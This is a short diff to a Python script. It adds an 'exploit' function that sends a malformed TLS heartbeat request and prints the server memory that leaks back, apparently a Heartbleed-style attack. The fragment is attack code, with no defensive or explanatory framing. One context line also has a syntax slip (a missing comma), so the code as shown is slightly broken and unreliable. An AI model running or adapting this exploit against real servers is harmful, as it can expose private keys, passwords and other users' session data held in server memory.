@@ -62,3 +62,16 @@ def readServerHeartBeat(socket):
 		type, version packet_payload, msgType = readPacket(socket) # Reading four Heartbeat-responses
 		payload += packet_payload # combining the payload of four responses into one payload
 	return(type, version, payload, msgType)
+
+def exploit(socket):
+	HEART_BEAT_RESPONSE = 21 # 0x15 # Heartbeat-answer
+	payload = b''
+	socket.send(array.array('B', heartbeat)) # Sending a distorted request
+	print("Sent Heartbeat ")
+	type, version, payload, msgType = readServerHeartBeat(socket) # Reading four Heartbeat type packets is the answer
+	if type is not None:
+		if msgType == HEART_BEAT_RESPONSE:
+			print(payload.decode('utf-8')) # Displaying the payload contents
+	else:
+		print("No heartbeat received")
+	socket.close()
